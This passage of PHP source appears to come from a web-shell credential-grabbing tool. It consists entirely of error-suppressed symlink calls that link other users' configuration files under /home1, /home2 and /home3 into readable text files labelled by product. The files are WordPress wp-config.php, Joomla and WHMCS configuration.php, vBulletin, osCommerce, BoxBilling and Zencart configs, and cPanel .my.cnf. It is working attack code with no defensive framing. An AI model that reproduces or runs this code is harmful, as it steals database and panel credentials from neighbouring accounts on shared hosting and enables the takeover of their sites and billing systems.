    @symlink('/home1/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home1/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home1/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home1/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home1/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home1/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home1/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    //Home2
    
    @symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home2/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home2/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home2/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home2/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    //Home3
    
    @symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home3/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
